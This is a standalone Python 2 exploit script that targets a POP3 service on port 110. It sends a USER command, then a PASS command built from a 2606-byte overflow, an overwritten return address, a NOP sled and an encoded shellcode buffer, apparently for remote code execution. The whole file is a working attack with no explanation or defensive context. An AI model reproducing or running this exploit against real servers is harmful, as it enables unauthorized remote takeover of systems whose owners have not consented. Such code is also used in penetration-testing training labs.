#!/usr/bin/python2
import socket
import sys

if len(sys.argv) < 2:
    print("Execute %s ip", sys.argv[0])
    exit()

ip = sys.argv[1]

buf =  ""
buf += "\xdd\xc1\xba\x3c\x7f\xca\xfe\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x83\xc0\x04\x31\x50\x13\x03\x6c\x6c\x28"
buf += "\x0b\x70\x7a\x2e\xf4\x88\x7b\x4f\x7c\x6d\x4a\x4f\x1a"
buf += "\xe6\xfd\x7f\x68\xaa\xf1\xf4\x3c\x5e\x81\x79\xe9\x51"
buf += "\x22\x37\xcf\x5c\xb3\x64\x33\xff\x37\x77\x60\xdf\x06"
buf += "\xb8\x75\x1e\x4e\xa5\x74\x72\x07\xa1\x2b\x62\x2c\xff"
buf += "\xf7\x09\x7e\x11\x70\xee\x37\x10\x51\xa1\x4c\x4b\x71"
buf += "\x40\x80\xe7\x38\x5a\xc5\xc2\xf3\xd1\x3d\xb8\x05\x33"
buf += "\x0c\x41\xa9\x7a\xa0\xb0\xb3\xbb\x07\x2b\xc6\xb5\x7b"
buf += "\xd6\xd1\x02\x01\x0c\x57\x90\xa1\xc7\xcf\x7c\x53\x0b"
buf += "\x89\xf7\x5f\xe0\xdd\x5f\x7c\xf7\x32\xd4\x78\x7c\xb5"
buf += "\x3a\x09\xc6\x92\x9e\x51\x9c\xbb\x87\x3f\x73\xc3\xd7"
buf += "\x9f\x2c\x61\x9c\x32\x38\x18\xff\x5a\x8d\x11\xff\x9a"
buf += "\x99\x22\x8c\xa8\x06\x99\x1a\x81\xcf\x07\xdd\xe6\xe5"
buf += "\xf0\x71\x19\x06\x01\x58\xde\x52\x51\xf2\xf7\xda\x3a"
buf += "\x02\xf7\x0e\xec\x52\x57\xe1\x4d\x02\x17\x51\x26\x48"
buf += "\x98\x8e\x56\x73\x72\xa7\xfd\x8e\x15\x08\xa9\x90\xfd"
buf += "\xe0\xa8\x90\xfc\x4b\x25\x76\x94\xbb\x60\x21\x01\x25"
buf += "\x29\xb9\xb0\xaa\xe7\xc4\xf3\x21\x04\x39\xbd\xc1\x61"
buf += "\x29\x2a\x22\x3c\x13\xfd\x3d\xea\x3b\x61\xaf\x71\xbb"
buf += "\xec\xcc\x2d\xec\xb9\x23\x24\x78\x54\x1d\x9e\x9e\xa5"
buf += "\xfb\xd9\x1a\x72\x38\xe7\xa3\xf7\x04\xc3\xb3\xc1\x85"
buf += "\x4f\xe7\x9d\xd3\x19\x51\x58\x8a\xeb\x0b\x32\x61\xa2"
buf += "\xdb\xc3\x49\x75\x9d\xcb\x87\x03\x41\x7d\x7e\x52\x7e"
buf += "\xb2\x16\x52\x07\xae\x86\x9d\xd2\x6a\xa6\x7f\xf6\x86"
buf += "\x4f\x26\x93\x2a\x12\xd9\x4e\x68\x2b\x5a\x7a\x11\xc8"
buf += "\x42\x0f\x14\x94\xc4\xfc\x64\x85\xa0\x02\xda\xa6\xe0"


password = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * (390-351) + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, 110))
response = s.recv(1024)
print(response.decode('utf8'))

s.send(b'USER teste\r\n')
response = s.recv(1024)
print(response.decode('utf8'))

p = 'PASS '+password+'\r\n'
s.send(p)
